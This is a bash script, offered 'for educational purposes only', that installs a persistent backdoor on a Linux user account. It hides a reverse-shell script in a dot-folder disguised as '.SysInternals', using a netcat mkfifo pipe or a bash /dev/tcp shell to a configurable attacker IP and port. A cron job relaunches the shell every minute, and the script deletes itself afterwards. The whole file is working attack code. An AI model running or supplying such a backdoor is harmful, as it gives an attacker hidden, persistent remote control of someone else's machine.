#!/bin/bash

#FOR EDUCATIONAL PURPOSES ONLY 
#We do not carry responsibility for how you use this... You ,the user, are self responsible for any damage caused running this script.

#Backdoor can be removed from the system using - "rm -rf ~/.DirectoryName/; crontab -r"
                                                                                                                                                
#Change these variables.                                                  
IP=XXX                #Change
PORT=XXX              #Change 
DIR=".SysInternals"   #Example
FILENAME="config"     #Example
CURR_SCRIPT="$0"      #DON'T change

if ! [ -d ~/${DIR} ] && ! [ -e ~/${DIR}/${FILENAME}.sh ]; then #Checks if the backdoor folder exists, if it doesn't create it.
                                                               #Make sure the folder isn't named same as something essential... 
    mkdir ~/${DIR}/
    touch ~/${DIR}/${FILENAME}.sh
fi

if  [ -x "$(command -v nc)" ]; then  #Checks if netcat exists on the filesystem, if it does use netcat rev shell, if it doesn't use bash -i
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" > ~/${DIR}/${FILENAME}.sh #Universal way of getting a nc reverse shell even if -e is disabled
else 
  echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" > ~/${DIR}/${FILENAME}.sh 
fi

chmod +x ~/${DIR}/${FILENAME}.sh #Makes the backdoor executable
(crontab -l 2>/dev/null; echo "* * * * * bash $HOME/${DIR}/${FILENAME}.sh") | crontab - #Creates the cronjob responsible for calling the backdoor every MINUTE
rm $CURR_SCRIPT #Removes this script after the usage.
